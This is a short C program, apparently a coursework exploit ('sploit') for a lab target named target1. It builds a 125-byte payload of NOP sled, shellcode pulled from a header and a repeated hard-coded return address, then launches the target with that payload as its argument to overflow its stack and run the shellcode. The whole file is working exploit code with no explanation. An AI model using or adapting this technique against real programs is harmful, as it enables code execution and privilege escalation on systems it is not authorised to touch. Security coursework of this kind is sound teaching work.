#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define RA "\x10\xfe\x21\x20"
#define LEN 125
#define NOP 0x90
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buf[LEN];
	memset(buf,NOP,LEN);
	memcpy(buf,shellcode,strlen(shellcode));
	int i;
	for(i = strlen(shellcode) + 4 - strlen(shellcode)%4; i < LEN - LEN%4; i+=4){
		memcpy(buf+i,RA,4);
	}
	buf[LEN-1]='\0';


	args[0] = TARGET;
	args[1] = buf;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
